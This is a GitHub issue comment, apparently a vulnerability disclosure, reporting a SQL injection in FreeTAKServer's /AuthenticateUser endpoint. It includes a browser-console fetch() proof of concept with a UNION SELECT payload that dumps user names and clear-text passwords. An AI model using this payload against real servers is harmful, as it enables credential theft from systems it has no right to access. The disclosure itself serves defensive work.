### **[Securitybits-io](/Securitybits-io)** commented [Feb 16, 2022](#issue-1139772026)

| The API endpoint `/AuthenticateUser` contains a SQL Injection into the SQLite3 Database that is handling the authentication process of the SystemUsers. In order to exploit this vulnerability the attacker need to possess a valid API key, which can either be leaked through the XSS from an End User Device, or given as a part of the UAV Operator ability which broadcasts the GPS and Video feed of a UAV-Drone. From the SQL Injection it is possible to list all the Username, UsedID and Clear-Text passwords in the database. Proof of Concept Posting the follwing snippet into a web browsers console will trigger the SQL Injection and return the name and password for each user in the SystemUsers table.  ``` fetch("http://atak.FreeTAKServer.com:19023/AuthenticateUser?username=abc\" UNION SELECT (SELECT group_concat(name||':'||password) FROM SystemUser),'b','c','PASSWORD','d','e'--&password=PASSWORD", {     "headers": {       "accept": "*/*",       "accept-language": "en-US,en;q=0.9",       "authorization": "Bearer ValidAPIKey",       "content-type": "application/json"     },     "mode": "cors"   });  ```  Will return the following response: [sqli_response](https://user-images.githubusercontent.com/14073684/154236898-a613d20a-92e3-4ab2-88de-95f5f40c18d0.jpg)  Which clearly shows the database results in clear-text. |
